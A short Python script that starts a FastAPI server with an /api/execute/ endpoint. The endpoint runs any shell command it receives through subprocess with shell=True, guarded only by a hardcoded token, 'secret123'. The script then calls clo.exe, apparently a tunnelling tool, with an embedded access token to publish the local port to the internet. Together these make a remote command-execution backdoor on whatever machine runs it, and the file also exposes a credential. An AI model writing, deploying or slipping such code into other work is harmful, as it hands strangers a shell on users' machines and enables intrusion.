import threading
from fastapi import FastAPI, HTTPException, Header, Depends
from pydantic import BaseModel
import subprocess
from typing import Optional
import uvicorn
import os

app = FastAPI()


clo_exe = ""


port = 25561

class CommandRequest(BaseModel):
    command: str

@app.api_route("/api/execute/", methods=["GET", "POST"])
async def execute_command(
    cmd: Optional[CommandRequest] = None, 
    x_token: str = Header(None),
    command: Optional[str] = None 
    ):
    if x_token != "secret123":
        raise HTTPException(status_code=401, detail="Unauthorized")
    
    if command:
        cmd_to_execute = command
    elif cmd:
        cmd_to_execute = cmd.command
    else:
        raise HTTPException(status_code=400, detail="No command provided")
    
    try:
        result = subprocess.run(
            cmd_to_execute, 
            shell=True, 
            capture_output=True, 
            text=True,
            timeout=30
        )
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


def api():
    uvicorn.run(app, host="127.0.0.1", port=port)

def main():
    server_thread = threading.Thread(target=api, daemon=True)
    server_thread.start()
    
    import time
    time.sleep(2)
    
    os.system("clo.exe set token WnU4U4I6SbeA8vSFsXCmw_TNYirqUHgG7tBvLYjzcLQ")
    os.system(f"clo.exe publish http {port}")

if __name__ == "__main__":
    main()
